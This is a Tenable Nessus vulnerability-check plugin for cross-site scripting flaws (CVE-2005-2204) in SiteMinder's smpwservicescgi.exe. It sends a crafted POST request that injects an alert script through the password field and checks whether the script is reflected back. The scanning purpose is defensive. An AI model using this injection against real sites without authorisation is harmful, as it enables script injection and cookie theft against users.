#
# (C) Tenable Network Security
#


if (description) {
  script_id(18670);
  script_version("$Revision: 1.5 $");

  script_cve_id("CVE-2005-2204");
  script_bugtraq_id(14203);

  name["english"] = "SiteMinder Multiple Cross-Site Scripting Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a CGI script that is affected by
several cross-site scripting vulnerabilities. 

Description :

The remote host is running SiteMinder, an access-management solution
from Netegrity / Computer Associates. 

The installed version of SiteMinder suffers from several cross-site
scripting flaws in its 'smpwservicescgi.exe' script.  An attacker can
exploit these flaws to inject arbitrary HTML and script code into the
browsers of users of the affected application, thereby leading to
cookie theft, site mis-representation, and similar attacks. 

See also : 

http://archives.neohapsis.com/archives/bugtraq/2005-07/0112.html
http://archives.neohapsis.com/archives/bugtraq/2005-07/0163.html

Solution : 

Unknown at this time.

Risk factor : 

Low / CVSS Base Score : 2
(AV:R/AC:H/Au:NR/C:N/A:N/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple cross-site scripting vulnerabilities in SiteMinder";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (get_kb_item("www/" + port + "/generic_xss")) exit(0);


# A simple alert.
xss = "<script>alert('" + SCRIPT_NAME + "');</script>";
exss = urlencode(str:xss);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Check whether the script exists.
  req = http_get(item:string(dir, "/smpwservicescgi.exe"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if (egrep(string:res, pattern:'img alt="Logo" src=".+/siteminder_logo\\.gif')) {
    # Try to exploit one of the flaws.
    postdata = string(
      "SMAUTHREASON=0&",
      "TARGET=/&",
      "USERNAME=nessus&",
      'PASSWORD=">', exss, "&",
      "BUFFER=endl"
    );
    req = string(
      "POST ", dir, "/smpwservicescgi.exe HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "User-Agent: ", get_kb_item("global_settings/http_user_agent"), "\r\n",
      "Content-Type: application/x-www-form-urlencoded\r\n",
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if we see our XSS.
    if (xss >< res) {
      security_note(port);
      exit(0);
    }
  }
}
